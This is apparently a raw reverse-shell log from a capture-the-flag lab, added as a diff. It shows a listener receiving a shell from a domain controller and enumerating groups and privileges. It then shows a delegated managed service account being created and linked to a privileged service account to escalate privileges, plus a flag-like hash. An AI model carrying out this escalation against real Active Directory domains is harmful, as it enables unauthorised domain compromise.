@@ -1,0 +1,82 @@
+[*] Listening on 0.0.0.0:4444
+[+] Connection from 10.129.32.209:55247
+checkpoint\ryan.brooks
+DC01
+GROUP INFORMATION
+Group Name                                 Type             SID                                            Attributes                                        
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
+CHECKPOINT\VPN-Users                       Group            S-1-5-21-3129162710-3498938529-1807524340-1109 Mandatory group, Enabled by default, Enabled group
+CHECKPOINT\DevTeam                         Group            S-1-5-21-3129162710-3498938529-1807524340-1110 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+PS C:\Program Files\Microsoft VS Code> PS C:\Program Files\Microsoft VS Code> PS C:\Program Files\Microsoft VS Code> 9c5fececd27490a0c159017b02885a21
+PS C:\Program Files\Microsoft VS Code> 
+Name                                
+----                                
+Recycle Bin Feature                 
+Privileged Access Management Feature
+Database 32k Pages Feature          
+Windows2025Domain
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+PS C:\Program Files\Microsoft VS Code> === OU=DMSAHolder,DC=checkpoint,DC=htb ===
+
+
+IdentityReference     : CHECKPOINT\ryan.brooks
+ActiveDirectoryRights : CreateChild
+ObjectType            : 00000000-0000-0000-0000-000000000000
+
+
+
+PS C:\Program Files\Microsoft VS Code> CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+PS C:\Program Files\Microsoft VS Code> Verbose, Debug, ErrorAction, WarningAction, InformationAction, ErrorVariable, WarningVariable, InformationVariable, OutVariable, OutBuffer, PipelineVariable, WhatIf, Confirm, AccountExpirationDate, AccountNotDelegated, AccountPassword, AuthenticationPolicy, AuthenticationPolicySilo, AuthType, Certificates, CompoundIdentitySupported, Credential, Description, DisplayName, DNSHostName, Enabled, HomePage, Instance, KerberosEncryptionType, ManagedPasswordIntervalInDays, Name, OtherAttributes, PassThru, Path, PrincipalsAllowedToDelegateToAccount, PrincipalsAllowedToRetrieveManagedPassword, RestrictToOutboundAuthenticationOnly, RestrictToSingleComputer, CreateDelegatedServiceAccount, SamAccountName, Server, ServicePrincipalNames, TrustedForDelegation
+PS C:\Program Files\Microsoft VS Code> CREATE_RESULT=True
+PS C:\Program Files\Microsoft VS Code> LINK_RESULT=False
+
+msDS-ManagedAccountPrecededByLink msDS-DelegatedMSAState
+--------------------------------- ----------------------
+                                                       0
+
+
+PS C:\Program Files\Microsoft VS Code> ERR1: Insufficient access rights to perform the operation
+PS C:\Program Files\Microsoft VS Code> ERR2: Insufficient access rights to perform the operation
+PS C:\Program Files\Microsoft VS Code> removed old
+PS C:\Program Files\Microsoft VS Code> CREATE2_OK
+
+msDS-ManagedAccountPrecededByLink                     msDS-DelegatedMSAState
+---------------------------------                     ----------------------
+CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb                      2
+
+
+PS C:\Program Files\Microsoft VS Code> NO_BLOB
+PS C:\Program Files\Microsoft VS Code> NO_MP_ATTR
+PS C:\Program Files\Microsoft VS Code> PRINC=CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
+PWDID_PRESENT=True
+INTERVAL=30
+CREATED=06/20/2026 18:18:13
+PS C:\Program Files\Microsoft VS Code> KDSKEYS=
+whenCreated        
+-----------        
+5/9/2026 1:39:24 AM
+                   
+
+
+
+PS C:\Program Files\Microsoft VS Code> done-marker
+PS C:\Program Files\Microsoft VS Code> 
+[*] Broker exiting
